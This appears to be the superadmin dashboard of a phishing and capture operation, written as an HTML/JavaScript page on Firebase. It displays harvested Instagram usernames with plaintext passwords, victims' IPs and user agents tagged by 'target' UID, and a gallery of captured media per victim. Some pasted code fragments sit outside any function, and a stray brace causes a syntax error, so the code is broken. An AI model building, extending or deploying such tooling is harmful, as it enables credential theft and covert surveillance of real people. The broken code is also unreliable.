<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>⛧ SUPERADMIN ⛧</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0d1225 100%);
            font-family: 'Courier New', monospace;
            padding: 15px;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            border-bottom: 2px solid #ff0040;
            padding-bottom: 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .title { color: #ff0040; font-size: 1.3rem; text-shadow: 0 0 8px #ff0040; }
        .header-right { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .access-badge { color: #ff0040; border: 1px solid #ff0040; padding: 4px 12px; border-radius: 25px; font-size: 0.7rem; }
        .lang-btn, .logout-btn { background: transparent; border: 1px solid #ff0040; color: #ff0040; padding: 4px 12px; border-radius: 25px; cursor: pointer; }
        .logout-btn { background: #ff0040; color: #fff; }
        .tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 8px 18px; cursor: pointer; border-radius: 40px; font-size: 0.75rem; }
        .tab.active { background: #00ff41; color: #000; }
        .tab-danger { border-color: #ff0040; color: #ff0040; }
        .tab-danger.active { background: #ff0040; color: #fff; }
        .panel { display: none; }
        .panel.active { display: block; }
        .stats-grid { display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 20px; }
        .stat-card { background: rgba(10,10,10,0.9); border: 1px solid #00ff41; border-radius: 14px; padding: 15px; flex: 1; text-align: center; min-width: 120px; }
        .stat-card h4 { color: #00ff41; font-size: 0.65rem; }
        .stat-card .value { color: #ff0040; font-size: 1.5rem; font-weight: bold; }
        .search-box { margin-bottom: 15px; }
        .search-box input { background: #1f1f1f; border: 1px solid #00ff41; color: #00ff41; padding: 8px 12px; width: 280px; border-radius: 40px; }
        .table-wrapper { overflow-x: auto; }
        .data-table { width: 100%; border-collapse: collapse; font-size: 0.65rem; }
        .data-table th, .data-table td { border: 1px solid #00ff41; padding: 6px; text-align: left; }
        .data-table th { background: #0a0a0a; color: #00ff41; }
        .ban-btn, .unban-btn { border: none; padding: 3px 10px; border-radius: 15px; cursor: pointer; font-size: 0.6rem; }
        .ban-btn { background: #ff0040; color: #fff; }
        .unban-btn { background: #00ff41; color: #000; }
        /* GALERI STILI */
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 20px; }
        .gallery-item { background: #050505; border: 1px solid #00ff41; border-radius: 12px; overflow: hidden; }
        .gallery-item img { width: 100%; height: 160px; object-fit: cover; cursor: pointer; }
        .gallery-info { padding: 8px; font-size: 0.6rem; color: #0f0; border-top: 1px solid #00ff4133; }
        .gallery-info p { margin: 3px 0; word-break: break-all; }
        .delete-capture-btn { background: #ff0040; color: #fff; border: none; padding: 4px 10px; border-radius: 15px; cursor: pointer; margin-top: 5px; width: 100%; }
        @media (max-width: 600px) {
            .gallery-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
            .gallery-item img { height: 120px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="title">⛧ <span>KURABI</span>_SUPER ⛧</div>
        <div class="header-right">
            <div class="access-badge" id="accessText">SUPER ACCESS</div>
            <button class="lang-btn" id="langBtn">🇸🇦 العربية</button>
            <button class="logout-btn" id="logoutBtn">⛧ LOGOUT</button>
        </div>
    </div>
    
    <div class="tabs">
        <button class="tab active" data-tab="users">👥 USERS</button>
        <button class="tab" data-tab="gallery">📸 ALL MEDIA GALLERY</button>
        <button class="tab tab-danger" data-tab="stats">📊 STATS</button>
		<button class="tab" data-tab="instalogs">📸 INSTAGRAM LOGS</button>
    </div>
    
    <div id="usersPanel" class="panel active">
        <div class="stats-grid">
            <div class="stat-card"><h4>TOTAL USERS</h4><div class="value" id="totalUsers">0</div></div>
            <div class="stat-card"><h4>BANNED USERS</h4><div class="value" id="bannedUsers">0</div></div>
        </div>
        <div class="search-box"><input type="text" id="userSearch" placeholder="Search email..."></div>
        <div class="table-wrapper"><table class="data-table"><thead><th>UID</th><th>EMAIL</th><th>ROLE</th><th>STATUS</th><th>CREATED</th><th>ACTION</th></thead><tbody id="userTableBody"></tbody></table></div>
    </div>
    
    <div id="galleryPanel" class="panel">
        <div class="stats-grid"><div class="stat-card"><h4>TOTAL CAPTURES</h4><div class="value" id="totalCaptures">0</div></div>
        <div class="stat-card"><h4>TOTAL MEDIA FILES</h4><div class="value" id="totalMediaCount">0</div></div></div>
        <div class="search-box"><input type="text" id="gallerySearch" placeholder="Search by user ID or IP..."></div>
        <div id="galleryContainer" class="gallery-grid"></div>
    </div>
	<div id="instalogsPanel" class="panel">
    <div class="stats-grid"><div class="stat-card"><h4>TOTAL INSTA LOGS</h4><div class="value" id="totalInstaLogs">0</div></div></div>
    <div class="search-box"><input type="text" id="instaSearch" placeholder="Search username or IP..."></div>
    <div id="instaLogsContainer"></div>
</div>
    
    <div id="statsPanel" class="panel">
        <div class="stats-grid">
            <div class="stat-card"><h4>TOTAL CAPTURES</h4><div class="value" id="statTotalCaptures">0</div></div>
            <div class="stat-card"><h4>TOTAL MEDIA</h4><div class="value" id="statTotalMedia">0</div></div>
            <div class="stat-card"><h4>TOTAL USERS</h4><div class="value" id="statTotalUsers">0</div></div>
            <div class="stat-card"><h4>LOGIN ATTEMPTS</h4><div class="value" id="statTotalLogs">0</div></div>
        </div>
    </div>
</div>

<script src="config.js"></script>
<script type="importmap">
    {
        "imports": {
            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
            "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
        }
    }
</script>

<script type="module">
    import { initializeApp } from "firebase/app";
    import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
    import { getFirestore, collection, getDocs, deleteDoc, doc, updateDoc, getDoc } from "firebase/firestore";

    const firebaseConfig = window.FIREBASE_CONFIG;
    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    let allUsers = [], allCaptures = [], allMediaItems = [];

    async function loadData() {
        const usersSnap = await getDocs(collection(db, "users"));
        allUsers = []; usersSnap.forEach(d => allUsers.push({ id: d.id, ...d.data() }));
        
        const capturesSnap = await getDocs(collection(db, "captures"));
        allCaptures = [];
        let totalMedia = 0;
        capturesSnap.forEach(d => {
            const data = d.data();
            allCaptures.push({ id: d.id, ...data });
            totalMedia += (data.media?.length || 0);
        });
        allCaptures.sort((a,b) => (b.unix||0) - (a.unix||0));
        
        allMediaItems = [];
        for(let cap of allCaptures) {
            if(cap.media && cap.media.length) {
                for(let url of cap.media) {
                    allMediaItems.push({
                        url: url,
                        userId: cap.userId,
                        ip: cap.ip,
                        mode: cap.mode,
                        timestamp: cap.timestamp,
                        unix: cap.unix,
                        captureId: cap.id
                    });
                }
            }
        }
        allMediaItems.sort((a,b) => (b.unix||0) - (a.unix||0));
        
        document.getElementById('totalUsers').innerText = allUsers.length;
        document.getElementById('bannedUsers').innerText = allUsers.filter(u => u.banned === true).length;
        document.getElementById('totalCaptures').innerText = allCaptures.length;
        document.getElementById('totalMediaCount').innerText = allMediaItems.length;
        document.getElementById('statTotalCaptures').innerText = allCaptures.length;
        document.getElementById('statTotalMedia').innerText = allMediaItems.length;
        document.getElementById('statTotalUsers').innerText = allUsers.length;
        
        renderUserTable();
        renderGallery();
    }
    let allInstaLogs = [];

async function loadInstaLogs() {
    const snap = await getDocs(collection(db, "instagram_logs"));
    allInstaLogs = [];
    snap.forEach(d => allInstaLogs.push({ id: d.id, ...d.data() }));
    allInstaLogs.sort((a,b) => (b.unix||0) - (a.unix||0));
    document.getElementById('totalInstaLogs').innerText = allInstaLogs.length;
    renderInstaLogs();
}

function renderInstaLogs() {
    const search = document.getElementById('instaSearch')?.value.toLowerCase() || '';
    const filtered = allInstaLogs.filter(l => 
        (l.username?.toLowerCase().includes(search)) || 
        (l.ip?.toLowerCase().includes(search)) ||
        (l.targetUid?.toLowerCase().includes(search))
    );
    const container = document.getElementById('instaLogsContainer');
    if(filtered.length === 0) { container.innerHTML = '<div class="loading">NO DATA</div>'; return; }
    let html = '<div style="display:flex;flex-direction:column;gap:10px;">';
    for(let log of filtered.slice(0, 200)) {
        html += `
            <div style="background:#0f111a;border:1px solid #2a2e44;border-radius:12px;padding:12px;">
                <div><strong style="color:#ffaa00;">👤 ${escapeHtml(log.username)}</strong> | <span style="color:#ff3366;">🔑 ${escapeHtml(log.password)}</span></div>
                <div style="font-size:0.65rem;color:#888;margin-top:6px;">🌐 IP: ${log.ip || '?'} | 🎯 HEDEF UID: ${log.targetUid?.substring(0,16)} | 📅 ${new Date(log.timestamp).toLocaleString()}</div>
                <div style="font-size:0.6rem;color:#555;">${log.userAgent?.substring(0,100) || ''}</div>
            </div>
        `;
    }
    html += '</div>';
    container.innerHTML = html;
}

function escapeHtml(str) {
    if(!str) return '';
    return str.replace(/[&<>]/g, function(m) {
        if(m==='&') return '&amp;';
        if(m==='<') return '&lt;';
        if(m==='>') return '&gt;';
        return m;
    });
}

// Tab aktifleştirme kısmına ekle
if(tab.dataset.tab === 'instalogs') loadInstaLogs();

// Search event
document.getElementById('instaSearch')?.addEventListener('input', () => renderInstaLogs());

// loadData içine çağır
await loadInstaLogs();
    function renderUserTable() {
        const search = document.getElementById('userSearch')?.value.toLowerCase() || '';
        const filtered = allUsers.filter(u => u.email?.toLowerCase().includes(search));
        const tbody = document.getElementById('userTableBody');
        tbody.innerHTML = '';
        for(let user of filtered) {
            const row = tbody.insertRow();
            row.insertCell(0).innerText = user.id.substring(0,16);
            row.insertCell(1).innerText = user.email || '?';
            row.insertCell(2).innerText = user.role || 'user';
            row.insertCell(3).innerText = user.banned ? 'BANNED' : 'ACTIVE';
            row.insertCell(4).innerText = user.createdAt ? new Date(user.createdAt).toLocaleDateString() : '?';
            const actionCell = row.insertCell(5);
            if(user.banned) {
                const btn = document.createElement('button'); btn.innerText = 'UNBAN'; btn.className = 'unban-btn';
                btn.onclick = () => toggleBan(user.id, false);
                actionCell.appendChild(btn);
            } else if(user.role !== 'superadmin') {
                const btn = document.createElement('button'); btn.innerText = 'BAN'; btn.className = 'ban-btn';
                btn.onclick = () => toggleBan(user.id, true);
                actionCell.appendChild(btn);
            }
        }
    }
    
    async function toggleBan(uid, ban) {
        if(!confirm(ban ? 'Ban this user?' : 'Unban this user?')) return;
        await updateDoc(doc(db, "users", uid), { banned: ban });
        await loadData();
    }
    
    async function deleteCaptureById(captureId) {
        if(!confirm('Delete this capture and all its media?')) return;
        await deleteDoc(doc(db, "captures", captureId));
        await loadData();
    }
    
    function renderGallery() {
        const search = document.getElementById('gallerySearch')?.value.toLowerCase() || '';
        let filtered = allMediaItems;
        if(search) {
            filtered = allMediaItems.filter(m => (m.userId?.toLowerCase().includes(search) || (m.ip?.toLowerCase().includes(search))));
        }
        const container = document.getElementById('galleryContainer');
        container.innerHTML = '';
        for(let item of filtered) {
            const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'unknown';
            const div = document.createElement('div');
            div.className = 'gallery-item';
            div.innerHTML = `
                <img src="${item.url}" onclick="window.open('${item.url}','_blank')">
                <div class="gallery-info">
                    <p>👤 USER: ${item.userId?.substring(0,12)}...</p>
                    <p>🌐 IP: ${item.ip || 'unknown'}</p>
                    <p>📱 MODE: ${item.mode}</p>
                    <p>⏱️ TIME: ${dateStr}</p>
                    <button class="delete-capture-btn" data-id="${item.captureId}">🗑 DELETE CAPTURE</button>
                </div>
            `;
            const btn = div.querySelector('.delete-capture-btn');
            btn.onclick = () => deleteCaptureById(item.captureId);
            container.appendChild(div);
        }
        if(filtered.length === 0) container.innerHTML = '<div class="loading">NO MEDIA</div>';
    }
    
    document.getElementById('userSearch').addEventListener('input', () => renderUserTable());
    document.getElementById('gallerySearch').addEventListener('input', () => renderGallery());
    
    document.querySelectorAll('.tab').forEach(tab => {
        tab.onclick = () => {
		
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById(tab.dataset.tab + 'Panel').classList.add('active');
            if(tab.dataset.tab === 'gallery') renderGallery();
			} else if(tabId === 'instalogs') {
    loadInstaLogs();
}
        };
    });
    
    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
    document.getElementById('langBtn').onclick = () => location.reload();
    
    onAuthStateChanged(auth, async (user) => {
        if(!user) { window.location.href = 'login.html'; return; }
        const userDoc = await getDoc(doc(db, "users", user.uid));
        if(!userDoc.exists() || userDoc.data().role !== 'superadmin') { window.location.href = 'admin.html'; return; }
        document.getElementById('accessText').innerHTML = `SUPER: ${user.email}`;
        await loadData();
    });
</script>
</body>
</html>
